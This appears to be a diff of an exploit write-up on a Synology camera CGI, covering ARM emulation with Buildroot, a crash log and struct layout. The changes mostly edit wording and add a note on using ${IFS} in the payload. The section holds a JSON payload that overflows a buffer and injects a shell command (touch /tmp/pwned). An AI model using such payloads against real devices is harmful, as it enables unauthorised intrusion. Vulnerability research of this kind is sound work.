@@ -34,7 +34,7 @@ $ file squashfs-root/bin/busybox
 squashfs-root/bin/busybox: ELF 32-bit LSB pie executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 4.19.0, stripped
 ```
 
-The architecture is armeabi with glibc used. Obtain Buildroot with that version and build a small kernel along with the rootfs with the kernel 4.19.91 version and glibc. The `vexpress-a9` default config can be used:
+The architecture is armeabi with glibc used. To proceed, obtain Buildroot with that version and build a small kernel along with the rootfs with the kernel 4.19.91 version and glibc. You can utilize the default config for `vexpress-a9`:
 
 ```bash
 make qemu_arm_vexpress_defconfig
@@ -69,7 +69,7 @@ Error 500: Internal Server Error
 Error: CGI program sent malformed or too big (>16384 bytes) HTTP headers: []
 ```
 
-The file which logs the error in `/tmp/core_dump_log.txt`:
+The file which logs the error is `/tmp/core_dump_log.txt`:
 
 ```c
 synocam_param.c core dumped at 1970-01-10 00:36:22
@@ -135,11 +135,15 @@ Since the `get` and `data` attributes are placed at the beginning of `stream_t` 
 
 ![structures](./images/structures.png)
 
-Below is a simple payload :
+Below is a simple payload:
 
 ```json
 {"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;touch${IFS}/tmp/pwned;p\u0403v": ""}
 ```
+
+The use of `${IFS}` is due to the `%s %s` format string utilized by `sscanf`. Brace expansion isn’t functional because it is not supported.
+
+![brace_expansion](./images/brace_expansion.png)
 
 ## ASLR
 
